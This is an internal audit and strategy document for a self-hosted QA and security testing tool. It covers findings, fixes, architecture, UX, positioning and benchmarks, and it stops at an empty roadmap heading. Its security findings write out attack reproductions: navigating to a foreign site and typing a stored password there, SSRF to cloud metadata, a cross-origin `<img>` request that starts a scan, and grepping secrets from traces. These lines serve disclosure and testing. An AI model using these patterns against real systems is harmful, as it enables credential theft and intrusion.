# QAX — Product Audit, Strategy and Execution (2026-10-20)

*Written as the whole product company (product, QA architecture, AI, architecture, AppSec, UX,
backend, DevOps, marketing, docs, evaluation). Labels: **[V]** verified fact (test, run or file
cited) · **[O]** observation · **[H]** hypothesis · **[R]** recommendation. Nothing here is
estimated as if measured. Phases and dates stay in [PLAN.md](../PLAN.md); this is the audit and
the strategy behind the next stage. Competitor facts: [COMPETITORS_2026-10-20.md](COMPETITORS_2026-10-20.md).*

---

## 1. Executive summary

- **Where QAX stands [V]:** a self-hosted tool with two verified engines — a security scan that
  proves findings against control requests (gate: 32/32 planted bugs, 0 FP; 10 real apps) and a
  functional E2E runner in a real browser (10 real apps across Django, Flask, Svelte, React,
  Angular, Java, .NET: 68/68 correct verdicts, 20/20 negative controls failed). It never counts a
  case that did not fully run as a pass.
- **Its weakest link [V]:** the on-ramp. Writing test cases from a story/repo has **never run
  against a live model** (no credit); Jira story input, PR input, Xray and Zephyr have only ever
  been exercised with mocks.
- **The audit found and fixed a P0 [V]:** an AI-written (possibly prompt-injected) test case could
  take the browser to another site — or a cloud-metadata address — and type a stored secret into
  it, masked as •••• in the report. Fixed with an origin guard; proven by a test with a recording
  "attacker" server. Three P1s fixed with it (below).
- **The opportunity [R]:** become the **release check a team can trust** — for each change or
  story, a verdict per acceptance criterion with proof (steps, screenshots, requests), functional
  and security together, on the team's own machines, with no false bug reports. Writing tests is
  a commodity (Xray now does it); proving behaviour is not.

## 2. Current product reality

| Capability | State | Evidence |
|---|---|---|
| Security scan (deterministic probes, control requests) | ✅ verified | evals/gate.py, PLAN §9, 10 apps |
| Browser E2E execution (Chromium, Firefox, WebKit, mobile emulation, iframes, shadow DOM) | ✅ verified | tests/test_browser_engine.py (44 tests), corpus |
| Reading an app from its URL (`map`) | ✅ verified | 10-app corpus; 6 reader defects found by Java/Angular/.NET apps, fixed |
| API execution | ✅ verified | test_api_runner_egress.py, gate |
| Traceability (criteria → cases → verdicts) | ✅ deterministic part; ⚠️ the `Covers:` tag depends on the model | tests; live model not run |
| AI test generation (functional) | ⛔ **not verified** | no live run (credit); harness ready: `make eval-generation` |
| Jira bug filing | 🟡 partial | 2 live bugs (scan path); functional path dry-run only |
| Jira story input, PR input | ⛔ code only, never exercised | no test, no live run |
| Xray export/results, Zephyr | ⛔ mocked only (Zephyr Cloud path fixed today, unverified) | — |
| Excel export | ✅ now tested (was untested) | test_excel_export_writes_a_workbook… |
| AI healing | 🟡 opt-in; the safety rules are tested with a fake model (assertions/outcome failures never healed, a healed pass is marked); never run against a live model | tests/test_hardening_round.py |
| Change-based test selection | ✅ first version | core/change_selection.py; evals/change_bench.py: 3 seeded PetClinic changes, 0 missed; UI + MCP + overview card |
| Failure triage app-bug vs environment vs test | ✅ rules (core/triage.py): every non-pass carries `cause`; test/environment never filed as bugs | tests/test_triage.py |
| Flaky detection | ✅ run history + quarantine (still run, never filed, not blocking readiness) | run_history.py |
| Evidence: screenshots, traces, page errors, a11y/perf, HAR on failure (secrets redacted) | ✅ | tests; evidence-completeness card |
| CI | 🟡 `execute --yes --junit` tested; workflow files never run on a real CI | — |
| Native mobile (Appium) | ❌ missing | emulation only |
| Packaging: pip, Docker | ✅ verified this week | pip in clean venv; image runs a browser job |
| Dead code | ✅ none of consequence — a re-check (2026-10-20) found the earlier "dead modules" list wrong: the UI tour (tour_service/live_tour) runs inside every scan; response_formatter, jira_gap_analyzer, bug_fetcher, skill_library, markdown_reporter, story/file adapters are used by analyze/pipeline/smart_checker; reporting_service is the services-layer reporting facade (tested, kept for the API/hosted mode) | grep of import sites |

## 3. Critical audit findings (all P0/P1 below are FIXED, with tests)

| # | Sev | Finding | Evidence / repro | Fix | Verification |
|---|---|---|---|---|---|
| S1 | **P0** | Browser runner had no origin guard: a case could `navigate` to any site / 169.254.169.254 and `fill {{env:QAX_VAR_*}}` there; `@evil/` joined into the URL | action_mapper navigate + fill; no route guard | core/origin_guard.py: navigation and secret typing only on APP_BASE_URL's origin (+QAX_ALLOWED_ORIGINS, e.g. SSO); a context route guard blocks main-frame navigation off the app and **inspects redirects before following them** (no request leaves); steps on a foreign page are refused | test_a_test_case_cannot_take_the_browser_or_a_secret_to_another_site (recording attacker server: canary never received; no top-level visit) |
| S2 | P1 | App reader followed redirects off the app and auto-login typed the operator's password on whatever page had a password field | app_mapper landed URL unchecked; login_if_needed no origin check | off-origin pages skipped and listed; login only on the app's origin | test_the_app_reader_never_reads_or_logs_in_to_another_site |
| S3 | P1 | GET /api/scan/stream started an active scan from any localhost page (`<img src>` is "same-site", sends no Origin) | web/server.py guard | GET refused unless Sec-Fetch-Site is same-origin/none | test_a_page_on_another_localhost_port_cannot_start_a_scan_with_a_get |
| S4 | P1 | Playwright traces store typed secrets in plain text and were served | tracing.start(snapshots=True) | a case that types a `{{env:}}` secret keeps no trace; kept traces are 0600 | test_a_trace_of_a_case_that_types_a_secret_is_not_kept |
| S5 | P2 | Concurrent web jobs could swap credentials through process env | mapper set APP_* without the browser lock | the reader runs under the browser lock | web tests |
| S6 | P2 | AI provider: key sent in two headers, redirects followed, plain http allowed | ai_provider.py | one header; no redirects; https unless loopback | test_inputs_cannot_reach_secrets… |
| S7 | P2 | Repo input: hidden folders (~/.ssh) could be sent to the AI; http clones; MCP cases_file any path | functional.py, mcp_server.py | hidden folders refused, QAX_REPO_ROOTS, https only, no git redirects, workspace-only cases_file | same test |
| B1 | P1 | **The web UI's JavaScript was broken in commit 65403f7** (an apostrophe in a string) — every Python test passed | node parse | fixed + test_the_ui_javascript_parses | test |
| B2 | P1 | Zephyr Cloud users were sent to the Server v1 path | zephyr_adapter.py | Cloud v2 by default, Server via ZEPHYR_SERVER (unverified live) | payload test |
| B3 | P2 | History reader treated any JSON in the folder as a run | run_history.py | only time-named run files | overview test |
| B4 | P2 | Weak tests (`assert … or True`), stale model ids, wrong "valid commands" list | inventory | fixed | tests |
| R1 | **Risk** | Earlier corpus runs did not record app URL / start command → not reproducible | evidence doc | benchmark manifest requires both; 7 older apps marked NOT RECORDED | — |

### 3a. Finding details — impact, reproduction, acceptance criteria

| # | User / business impact | Reproduction (before the fix) | Root cause | Acceptance criteria (all met) |
|---|---|---|---|---|
| S1 | a stored test password (or token) silently posted to an attacker; SSRF to cloud metadata from the operator's machine — a breach caused BY the testing tool; fatal for trust | a case: `navigate https://other.site/` → `fill #x {{env:QAX_VAR_PASSWORD}}` → `click`; report shows •••• and PASS | navigation and typing trusted the case; only the API runner had an origin check | navigation off the app = ERROR "refused"; redirects off the app not followed (no request leaves); a secret is never typed on another origin (page or frame); a recording attacker server receives nothing |
| S2 | the operator's real password typed into a phishing page during `map` | an app link or `/login` that 302s to another host | landed URL never re-checked; login on any page with a password field | off-origin pages skipped and listed; login only on the app's origin; attacker server gets no POST |
| S3 | any local web page (incl. the app under test) can launch an active, non-read-only scan of any URL from the operator's machine | `<img src="http://localhost:8900/api/scan/stream?url=…&authorized=true&read_only=false">` on a localhost page | GET allowed; "same-site" not refused | GET from a browser page refused (403); curl/no-browser GET still answers |
| S4 | secrets readable by anyone who gets a trace file (attached to Jira, shared folder) | `--trace` + a case with `{{env:}}` → `unzip -p trace.zip \| grep secret` | Playwright traces record typed values | no trace kept for such cases; others 0600 |
| B1 | the whole web UI non-functional for anyone on that commit | open `/app` at 65403f7 → no button works | an apostrophe in a single-quoted JS string; no test parsed the JS | `node` parse test in the suite |
| B2 | Zephyr Cloud users: export silently fails (wrong API) | export with a Cloud token | Server v1 path used for Cloud | Cloud v2 by default; Server via `ZEPHYR_SERVER`; payload test (live unverified) |
| U1 | a user trusts the wrong number ("37 could not run" vs "14 skipped") — doubts the product | read-only scan of the gate target | plan counted fully-skipped checks; the result listed partly-run checks as "could not run" | wording distinguishes "skipped entirely" from "not fully tested (N ran in part)" |
| U2 | a team that loads its own browser cases is told they cannot run in the UI | load a browser-cases JSON → Preview run | engine stayed HTTP | engine picked from the cases; reasons name the UI fix |
| R1 | corpus results could not be repeated (no URL, start command or login recorded) | try to rerun linkding from the evidence | run records incomplete | manifest + `start-all.sh` + local `.bench.env`; 10 apps re-run on 2026-10-20 |

### 3b. Engineering audit (concurrency, timeouts, partial failures, performance, logging, dependencies) — fixed with tests

| # | Sev | Finding (confirmed) | Fix | Test |
|---|---|---|---|---|
| E1 | P1 | API runner followed redirects off the target: custom auth headers, static headers and the session cookie reached the other host | redirects followed by hand, each hop origin-checked | recording second server receives nothing |
| E2 | P1 | a browser crash mid-batch turned every remaining case into FAIL (fileable as bugs); a crashed parallel worker discarded all results | relaunch; else remaining = ERROR (environment); `gather(return_exceptions)` | executor test with a dead runner |
| E3 | P2 | concurrent scans corrupted each other's AI-usage numbers; no limit on concurrent scans; a closed stream kept attacking; `retry:` re-started scans | one scan at a time (409), cancel on disconnect, no `retry:` | lock + cancel tests |
| E4 | P2 | a failed UI tour / visual comparison looked like a clean result (Pillow not installed → every comparison errored silently) | listed under not-tested; `visual` extra | — (path covered by gate scans) |
| E5 | P2 | Jira duplicate check failed open (429 → duplicate filed); Xray re-authenticated per case after a failure (minutes of blocking) | fail closed with retries; stop after first auth failure | duplicate test |
| E6 | P2 | non-atomic map/selector/run writes; map saved outside the lock; run ids collided within a second; one bad file emptied the history | atomic writes, lock, microsecond ids, tolerant reader | history test |
| E7 | P2 | `pip install .` could resolve to requests/dotenv versions with known advisories; Pillow/PyYAML/urllib3 undeclared | floors = audited versions; extras `visual`, `yaml`; urllib3 declared | package metadata test |
| E8 | P3 | API runner: timeouts = FAIL (false regressions); unreadable expected_status = PASS | ERROR for both; "2xx" supported | redirect/egress test |
| E9 | P3 | page reader quadratic on large pages; NL fill path echoed passwords | memoized queries; masked | browser tests |
| R2 | P2 | **a regression I introduced today**: the generalized card rule renamed a dialog's submit (Beszel `add_system_button_2`), breaking its cases — caught by the 10-app benchmark | rule limited to table rows and 3+ repeated cards | dialog test |
| T1 | — | Beszel's systems table renders only visible rows; leftover test data (36 systems) pushed a renamed row out of the page → a false FAIL that FLIPPED between runs | cases filter before asserting and delete what they create (cleanup_steps); leftovers removed | benchmark: 7/7 ×3, 0 leftovers |

| E10 | P2 | raw exception text reached the UI in 9 places (scan, plan, execute, export, bug filing, clone, AI errors, MCP) — internal paths, URLs with credentials, tokens | core/public_error.py: cleaned message + a reference; full detail only in the log | ui-error tests (paths, user:pass@, token=, Bearer) |
| E11 | P2 | Jira/Xray writes failed on the first 429/503; the Xray token was never renewed (24 h expiry) | core/http_retry.py: retries 429/503 and never-sent connections with Retry-After/backoff; a create is NOT re-sent after 5xx or a read timeout (could duplicate); Xray token renewed after 23 h and once after a 401 | retry + token tests |
| E12 | P2 | a request waiting for the browser lock waited without limit behind a run of minutes | lock with a wait (QAX_BROWSER_WAIT, default 5 s) → 409 "busy — try again" | busy test |
| E13 | P1 (AI) | the grounding check only flagged cases that use an element not on the app — they still ran and failed for the wrong reason | executor gate: such a case is SKIP (cause test) until `"reviewed": true` or QAX_ALLOW_UNMAPPED=true; the run preview lists it as not run | gate tests |
| E14 | P1 (AI) | AI healing could turn a failed check into a pass (heal an assertion onto another element "with the right text") | healing only for locating failures of actions; never assertions or outcome checks; a healed pass carries `verdict_note` | fake-model healing tests |

**Finding details for E1–E14 (impact · reproduction before the fix · acceptance):**

| # | Impact | Reproduction (before) | Acceptance (met) |
|---|---|---|---|
| E1 | a session cookie / auth header sent to a third party | API case on an endpoint that 302s to another host; a recording server logs the header | the second server receives nothing; case = ERROR "redirect off the app" |
| E2 | a browser crash files N false bugs; a crashed worker loses a whole batch | kill the browser mid-batch | remaining cases ERROR (environment), never FAIL; other workers' results kept |
| E3 | wrong AI-cost numbers; scans piling up; a closed tab keeps attacking | start two scans; close the stream tab | second scan 409; closing the stream cancels |
| E4 | "clean" result while checks silently did not run | uninstall Pillow, run a visual check | the check is listed under not tested |
| E5 | duplicate Jira bug on a 429; minutes blocked by repeated Xray logins | 429 from search; bad Xray secret with 20 cases | fail closed (UNVERIFIED, not filed); one auth attempt per run |
| E6 | lost or corrupt map/history after a crash or two clicks | kill during a write; two runs in the same second | atomic writes; microsecond ids; one bad file does not hide others |
| E7 | installing QAX pulls versions with known advisories | `pip install .` in a clean venv | floors = audited versions (DEPENDENCY_AUDIT.md, 2026-10-09); no new CVE scan this round (pip-audit not installed) |
| E8 | false regressions on slow APIs; unreadable expectation counted as PASS | an endpoint that times out; `expected_status: "ok"` | both ERROR; "2xx" understood |
| E9 | slow reads of large pages; a password echoed in a log | a 5,000-element page; NL fill of a password | memoized queries; masked |
| E10 | internal paths/credentials shown to whoever sees the UI | make an export raise with a path in its message | UI text cleaned; detail in the log under the same ref |
| E11 | exports/bug filing fail under normal Jira throttling; long runs fail after 24 h | 429 on create; a token older than 24 h | create succeeds after a 429; a 500 is not re-sent; token renewed |
| E12 | the UI hangs for minutes with no explanation | start a browser run, then press Understand | 409 within QAX_BROWSER_WAIT with a clear sentence |
| E13 | wasted runs, misleading FAILs from invented elements | a generated case with `selector_key` not on the map | not run, reason names the element; runs after review |
| E14 | a real regression reported as PASS | assert step fails; fake healer suggests another element | healer not called; FAIL stands |

Performance (done since): the settle wait races the action's own requests against network idle
(adaptive); measured 79/79 correct with ~8 % less time overall (strategy/evidence, last section).

## 4. AI intelligence assessment

**Separation that holds [V]:** reasoning (AI: understand inputs, write cases) · execution
(Playwright/HTTP, deterministic) · verification (assertions, control requests, DB/API read-back in
the corpus) · evidence (screenshots, traces, page errors, requests). No LLM ever declares a PASS,
a bug, or a vulnerability. This is the product's backbone — keep it.

**Weaknesses [V/H]:**
1. Generation quality is unmeasured (no live run) — the biggest unknown in the product.
2. Requirements understanding is regex-level for numbering criteria [V]; semantic linking relies
   on the model writing `Covers: AC-n` [V].
3. No change awareness: nothing selects tests from a diff [V].
4. No triage between app defect, environment failure and broken test beyond ERROR rules [V].
5. Healing is unexercised [V] — and must stay opt-in until it can prove it never hides a regression.

**Improvements [R], in order:** (1) run `make eval-generation` the day credit (or a local model via
QAX_AI_PROVIDER) is available and gate on it; (2) a deterministic grounding check already flags
cases using elements not on the map — make it block, not just flag; (3) change → affected pages →
cases (map records which page each case touches; a diff of the app map + the PR's routes picks the
cases); (4) triage rules from signals QAX already has (DNS/connection errors, 5xx bursts, timeouts
on navigate = environment; unknown selector = test; assertion mismatch with page loaded = app).

### 4a. Target architecture — AI proposes, deterministic code decides

```
 inputs (URL · repo · story/Jira · PR diff)
   │
   ▼
 UNDERSTAND ── deterministic: app map (pages, elements, selectors checked unique), criteria numbering,
   │           security risks per criterion, repo file inventory
   │           AI (optional): repo summary, story clarification         ← untrusted text in, never commands
   ▼
 PROPOSE ───── AI: test cases (schema-bound, ISTQB techniques, Covers: AC-n, cleanup steps)
   │           GATES (deterministic, before anything runs): schema validation · grounding (every element
   │           on the map or flagged) · origin rule (no off-app URL) · secrets only as {{env:QAX_VAR_*}}
   ▼
 SELECT ────── deterministic: which cases a change touches (P2-1), smoke set always, flaky quarantine
   ▼
 EXECUTE ───── deterministic engines: Playwright (UI) · HTTP (API) · probes (security)
   │           guards: origin guard, read-only, browser lock, timeouts; AI healing OFF unless opted in,
   │           and a healed step is reported as HEALED, never silently PASS
   ▼
 VERIFY ────── deterministic oracles only: assertions on the page, control requests (security),
   │           read-back of persisted data (corpus), negative controls; a step that did not run ≠ PASS;
   │           a FAIL after an unrunnable step = ERROR (test problem)
   ▼
 TRIAGE ────── rules first (P1-4): app defect · test problem · environment; AI may *explain*, never re-label
   ▼
 EVIDENCE ──── screenshots, traces (never with secrets), page errors, requests/HAR (P1-5), run record
   ▼
 DECIDE ────── verdict per case → per criterion → per story/PR; bugs (ISTQB shape) → Jira only with
   │           operator OK; regression suite grows from filed bugs
   ▼
 LEARN ─────── run history (regressions/fixes/flaky), map refresh keeps names, feedback store (human-
               accepted only); every model/prompt change re-measured by eval-generation + bench + gate
```

### 4b. Interfaces and data contracts (what each stage takes and returns — as implemented)

Every stage is a function or service with a plain-JSON contract, so each can be tested, replaced or run by
MCP/CLI/web alike. A stage never raises across its boundary: failures come back as data (`error`, `cause`).

| Stage | Interface (code) | Input | Output (contract) | Trust rule |
|---|---|---|---|---|
| Understand · app | `core.app_mapper.map_app(url, username, password, max_pages, storage_state)` | URL (+ login or recorded session) | `AppMap{base_url, login_ok, pages:[{path, title, elements:{key: selector}, forms}], skipped_links, explored_actions, writes, error}` → `config/projects/<p>/app_map.json`, `selectors.json` | origin-guarded; selectors checked unique; off-app pages skipped |
| Understand · story | `core.traceability` (criteria numbering), Jira input adapter | story text / Jira key | `criteria:[{id: "AC-n", text}]` → `requirements.json` | deterministic numbering; story text is data, never instructions |
| Understand · repo | `web.functional._repo_source`, `core.code_reader` | https repo / allowed local root | file inventory + optional AI summary | hidden folders refused; QAX_REPO_ROOTS |
| Propose | `services.generation_service.GenerationService.generate(source, options)` | `GenerationOptions{user_story, content, app_map, repo_context, test_type}` | `GenerationResult{test_cases, invalid, summary, error}`; each case per `config/xray_schema.json` (required: test_case_id, title, …, manual_steps, automation_steps[{step_number, playwright_action, selector_key, value, assertion_type, assertion_value}], confidence_score, needs_review) + optional `cleanup_steps`, `api_steps`, `covers` | **untrusted output** |
| Gates | schema validator · `app_mapper.check_cases` → `unmapped_elements` · `test_executor.grounding_block` · `origin_guard.is_allowed` · `{{env:QAX_VAR_*}}` only | proposed cases | cases + `unmapped_elements`, `needs_review`; ungrounded cases held back | deterministic; AI cannot bypass |
| Select | `core.change_selection.select(cases, files, repo, project_dir)` | cases + `git diff --name-only` | `{selected:[{id, reasons}], skipped:[{id, reason}], run_all, why, affected_pages, unplaced_files}` | unknown impact or shared file → run all; smoke always |
| Execute | `TestExecutor.execute_batch(cases, runner)` · `api_runner` · scan orchestrator | runnable cases + target | batch `{total, passed, failed, errors, skipped, causes, writes_sent, results:[result]}` | origin guard, read-only, browser lock (409 busy), timeouts |
| Verify | assertions in `action_mapper`, `api_runner._status_matches`, scan control requests | page / response | step `{status: PASS\|FAIL\|ERROR\|SKIP\|HEALED, actual_result, error}` | a step that did not run ≠ PASS; healing never on assertions |
| Triage | `core.triage.classify(result)` | result | `cause ∈ {app, test, environment, unclear}` + `cause_why` | rules only; AI may explain, never relabel |
| Evidence | executor + `core.network_log.save` | run | result `{screenshot, steps[].screenshot, trace?, network_log?, page_errors, verdict_note}` | secrets redacted; trace dropped if a secret was typed |
| Decide | `core.traceability.requirement_verdicts`, `core.jira_bugs.functional_result_to_bug`, `JiraBugFiler.file/link/comment` | results + criteria | `[{id, text, verdict: PASSED\|FAILED\|NOT COVERED\|NOT FULLY RUN, cases}]`; bug `{title, steps, expected, actual, evidence, fingerprint}` | live writes only with operator OK + QAX_ALLOW_LIVE_EXPORT; duplicate check fails closed; retries never duplicate a create |
| Learn | `core.run_history.save_run(project, url, results, cost=, selection=)` | results | run record `{when, url, verdicts, causes, titles, evidence, cost?, selection?}`; quarantine; regression suite | only human-accepted feedback; every model/prompt change re-measured |

**Where AI is allowed:** understanding text, proposing cases, explaining a failure. **Where it is not:**
deciding PASS/FAIL, confirming a bug or vulnerability, choosing to write to Jira, navigating anywhere
the origin rule forbids. **Why this holds up:** every AI output passes deterministic gates before it can
act, and every verdict is produced by code that the benchmark scores against human-written truth.
**Agents / MCP:** QAX is exposed as an MCP *tool* (an independent check for coding agents); adding more
internal agents is not justified by any measured gap today — each would add cost and variance.

## 5. Missing skills, tools and integrations (the smallest set that matters)

| Add | Type | Problem solved | Cost / risk | Priority |
|---|---|---|---|---|
| Change → test selection | core engine | run what a change can break; the PR gate's whole point | medium; needs map↔route links | P2 (top) |
| Failure triage classifier (rules first) | core engine | stop wasting time on environment failures | low | P1 |
| HAR / network log per failed case | tool (Playwright record_har) | evidence for API-level root cause | low | P1 |
| Live verification of Jira story in / bugs out, Xray | integration | the promised loop | needs a Jira+Xray trial | P1 (founder) |
| axe-core | tool | full WCAG audit (basics exist) | licence review (MPL-2.0) | P2 |
| Appium | tool | native mobile | high; new runtime | P3 — not before web is sold |
| More AI agents | skill | — | adds cost and variance; no measured gap needs it | **not now** |

## 6. UI/UX assessment (first-time user, full journey, walked 2026-10-20 in the real UI)

| Journey step | What a new user met [O] | Status |
|---|---|---|
| 1–2 Understand what/why | Landing led with the scan only; `/app` opened with a marketing hero, work below the fold; headline still "Generate the tests" | ✅ fixed: landing leads with E2E + proof; compact app header |
| 3 Project | No project concept; every session from scratch | ✅ Project overview (cards from saved runs); ⏳ a project home page |
| 4 Connect repo / Jira | Repo: field exists. **Jira: no UI** — credentials only in `.env`, the UI only says "live filing is off" | ⏳ P1: a settings screen (status of Jira/Xray/AI, never values) |
| 5 Configure | Two project fields (Understand step and Run step) with the same meaning | ⏳ P2: one project field |
| 6 Before execution | Scan plan preview ✅; **plan said "14 skipped", the result said "37 could not run", "Tests run 6"** — contradictory | ✅ fixed: "skipped entirely" vs "not fully tested (N ran in part)", "Generated tests run" |
| 6b Functional plan | **Loading a browser-cases file left the HTTP engine selected** → "will not run — use the command line" | ✅ fixed: engine chosen from the cases; reasons point to the UI fix |
| 7 Run and monitor | Live log ✅; showed an internal temp path and the jargon "no code model" | ✅ fixed: "no source repository given — testing the running app only" |
| 7b Errors | Empty URL: silent focus, no message; errors rendered **below the visible area**; an error stayed after its cause was fixed | ✅ fixed: message, scroll into view, cleared on change |
| 8 Pass / Fail / Blocked / Inconclusive | PASS / FAIL / not run (ERROR, SKIP) consistently, "not passes" stated | ✅ (BLOCKED vs INCONCLUSIVE are one bucket — P2: split ERROR into "test problem" / "environment") |
| 9 Evidence | Scan: request/response, why, fix ✅. Functional: step screenshots, trace, page problems ✅ | ✅ |
| 10 Next actions | Scan: "File to Jira" ✅; Functional: file bugs, report ✅; no "what to do next" summary | ⏳ P2: a next-actions line from the verdicts |
| 11 Repeat after a change | Overview shows newly failing / fixed / flaky ✅ | ✅ |
| Accessibility of QAX itself | Basic WCAG checks on `/app`: no issue. **Past-scan rows were mouse-only** (clickable divs) | ✅ fixed: role=button, Enter/Space |
| Responsive | Works at 375–1440 px; the pane's narrow width stacks cards | ✅ |

## 7. Dashboard proposal

**Existing cards, assessed** (the ten questions condensed: problem · who · decision · data trustworthy? · right form · duplicate? · frequency · cost · priority):

| Existing | Assessment | Decision |
|---|---|---|
| "Scan & prove bugs" / "Functional QA (E2E)" mode cards | they are a track switch, not information; clear and accurate after today's copy fix | **keep** as the switch |
| Past scans (list) | answers "what did the last scans find?" for the scan track only; data trustworthy (saved payloads); was mouse-only | **keep**, fixed keyboard access; later fold into the project page |
| Scan result stats (Confirmed, Leads, Tests run, Duration, LLM cost, End-to-end) | "Tests run" mislabelled (generated tests, not checks); "End-to-end" unclear to a newcomer | **modify**: renamed to "Generated tests run"; P2 add a tooltip for End-to-end |

**Project overview (built; every number from a saved record):**

| Card | User problem → decision | Who | Data | Form | Interaction / drill-down | Freq. | Priority |
|---|---|---|---|---|---|---|---|
| Last run | did it pass? → ship / investigate | dev, QA | run history | card | → report of that run (P2: link) | every run | P1 ✅ |
| Since the run before | what newly broke? → fix first | dev | history compare | card + list | case ids → case | every run | P1 ✅ |
| Pass rate, last runs | getting better or worse? | lead | history | sparkline-like points | → runs list | weekly | P2 ✅ |
| Requirements (per criterion) | can this story ship? | PO, QA | last analysis + last run | table rows | criterion → its cases → evidence | per story | P1 ✅ |
| Regression suite | are fixed bugs staying fixed? | QA | regression file | count + keys | → suite file / load it | weekly | P2 ✅ |
| What QAX knows of the app | is the map stale? session saved? | QA | app map | card | → Understand step | when the UI changes | P2 ✅ |
| Security (last scan) | any proven P1? | dev lead | web_runs | card | → that scan | per scan | P1 ✅ |

**Worth adding (data needed first):**

| Card | Value | Needs | Priority |
|---|---|---|---|
| Coverage gaps | criteria with no case → write one | ✅ built | — |
| Flaky tests (quarantine) | stop flaky cases from blocking | ✅ built | — |
| Release readiness | one go/no-go per release | ✅ built (QAX's rule; a team-defined rule is still open) | — |
| Recent changes → affected cases | what to run for this PR | ✅ built ("Last change → cases run") | — |
| Cost per run | budget AI spend | ✅ built (run + generation, measured) | — |
| Evidence completeness | can a finding be verified independently? | ✅ built (steps + screenshot + observed result per non-pass) | — |
| Critical findings (cross-track) | one list of P1s from both tracks | ✅ built | — |

**Deliberately not built:** "time saved", "AI confidence", "quality score" — no trustworthy measurement exists; a number there would be invented. Layout: the overview sits at the top of Functional QA; P2 moves it to a project home that both tracks open into.

## 8. Market positioning

**The proposed statement** — "QAX بيختبر تطبيقك وهو شغال end to end، ويثبت اللي يلاقيه (وظيفي وأمني)،
على أجهزتك أنت، مع كل تعديل، ومربوط بالـ stories بتاعتك في Jira." — is directionally right but
**over-claims two things today**: "مع كل تعديل" (no real CI run yet) and "مربوط بالـ stories في Jira"
(story input never exercised live; functional bugs dry-run). "end to end", "يثبت", "وظيفي وأمني" and
"على أجهزتك" are verified.

| | Recommendation |
|---|---|
| First audience | product teams (5–50 engineers) shipping a web app with a staging environment and Jira, **without** a dedicated QA-automation team |
| Most painful problem | "we don't know if this release breaks a user flow or opens a hole, nobody maintains E2E tests, and scanners bury us in noise" |
| Value proposition | proof, not opinions: every result comes with the evidence that shows it, functional and security, on your machines |
| Headline (applied) | **Code review reads the diff. QAX proves what the running app does.** |
| Subheadline (applied) | Point QAX at your staging app. It runs your user flows end to end in a real browser and probes the API for security bugs — on your own machine — and reports only what it can prove: the steps, screenshots or request that show it, and a Jira bug ready to file. |
| CTAs | "Test your app end to end" · "Scan it for security bugs" · "Try the demo (no setup)" |
| Messages to test | "No false bug reports — a test that didn't run never passes" · "Your release check, with receipts" · "QA proof for teams without a QA team" |
| Claims to avoid until shown | runs on every change / every PR · writes tests from your Jira stories · Xray/Zephyr sync · zero false positives (absolute) · replaces QA engineers |
| Differentiation | vs XBOW/DAST: self-hosted, cents per run, functional too · vs Momentic/mabl: requirement-level verdicts, security, local · vs Xray AI: it runs and proves, not only writes |

## 9. Game-changer strategy

| | 1 Near-term: trustworthy story verdicts | **2 Differentiating: the change-aware proof loop (chosen)** | 3 Long-term: release proof bundles |
|---|---|---|---|
| User problem | "is this build OK for this story?" | "what does THIS change break — functionally and in security?" | "prove to a customer/auditor what was tested" |
| Value | a verdict per acceptance criterion with evidence | the right flows + security checks run on each PR/story; verdict per criterion; bugs linked back; regression suite grows by itself | a signed, independently checkable bundle per release |
| Differentiation | vs Xray AI / Momentic: they write or run tests; QAX proves per criterion | vs Canary (SaaS, no security), XBOW (security only, SaaS, per-test pricing), Playwright agents (building blocks): self-hosted, functional + security, never a false PASS | few tools sell evidence as the product |
| Architecture needed | live generation measured; Jira story in/out live; triage rules; HAR | + change → affected pages/cases (map ↔ routes ↔ diff), PR comment, CI on a real repo, project home | + signed evidence store, retention, hosted mode after the security gate |
| Complexity | low–medium (mostly verification of what exists) | medium: one new engine piece (selection) + integrations | high |
| Risks | AI case quality unknown | selection misses an affected flow → false confidence (mitigate: always run a smoke set + measure missed regressions) | regulatory scope, storage of customer evidence |
| Success measure | `make eval-generation` bars; first team weekly | missed-regression rate on seeded changes (target 0 on the corpus), PR-to-verdict time, false-bug rate 0, a design partner using it per PR | a customer accepts a bundle in an audit |
| Evidence that justifies investing | the generation bar met on 3+ apps | Phase-0 interviews confirm "what does this change break" is the top pain; seeded-change benchmark shows selection beats "run everything" on time without misses | a buyer asks for it |

**Why 2:** it compounds what is strongest and already verified (deterministic execution and proof),
targets the trust gap of AI testing, and sits in the space between Xray-AI, Canary and XBOW.
Rejected as the primary bet: more AI test authoring (commodity), autonomous pentesting (funded
incumbents), a managed QA service (people business, not product).

## 10. Benchmark plan

| Metric | Built? | How |
|---|---|---|
| Bug detection / missed defects / false failures / false passes | ✅ `make bench-functional` (evals/functional_bench.py) | truth = expected_outcome written before the run; never QAX's own judgement |
| Repeatability (verdict flips) | ✅ `--repeat N` | same app version, same cases |
| First-run success (tests that run) | ✅ | ERROR/SKIP share |
| Security recall / FP / reproducibility | ✅ `make eval` (gate) | golden target + secure twin |
| Generated-case quality (coverage, traceability, grounding, detection) | ✅ built, ⛔ not run | `make eval-generation` needs AI credit |
| Time per case | ✅ recorded | bench JSON |
| Cost per run | ✅ scans + functional runs and generation (approximate USD) | scoped meter, run record |
| Investigation time, maintenance effort | ❌ | needs people: Phase-0 sessions with a stopwatch |
| Baseline comparison | ❌ | same stories, (a) a QA engineer by hand, (b) Playwright test agents / a coding agent with Playwright MCP — same app versions, same time box |

**Run on all apps (2026-10-20 evening) [V]:** 11 entries (10 real apps + the demo), 79 cases, run twice (Beszel 3×):
79/79 correct, 7/7 known defects detected, 0 false failures, 0 flips — after fixing what it caught (a same-day
regression, a virtualized-list false FAIL from leftover test data, rate-limit false FAILs). Details:
strategy/evidence/FUNCTIONAL_QA_CORPUS_2026-10-19.md (last section).


**Change-based selection, measured (2026-10-20, evals/change_bench.py):** three seeded, built and run changes to
Spring PetClinic — phone validation dropped (Owner.java → 8 of 9 cases selected, the regression TC-PC-004 among
them), vet last name not shown (vetList.html → 1 of 9, TC-PC-007 caught), a message changed in the shared
messages.properties (→ all 9, by the shared-file rule, TC-PC-004 caught). **0 regressions missed**; cases saved
11 % / 89 % / 0 %. n = 3 seeds on one app — the method, not a general rate.

**Now in the merge gate [V]:** functional verdicts == truth on the demo app, twice, no flips.
Corpus result on record (2026-10-20): 10 apps, 68/68 correct, 20/20 negative controls failed — n=10,
hand-written cases, one machine; not a general accuracy claim.

## 11. Prioritized roadmap

*Effort = engineering days for one person who knows the code, estimated after reading the relevant
code; **uncertain** where marked. "Founder" = needs money, an account or people.*

### P0 — critical (done 2026-10-20)
S1–S4, B1 — see §3/§3a. Rollback: each is a guard; disabling it re-opens the hole, so none is behind a flag.

### P1 — core product

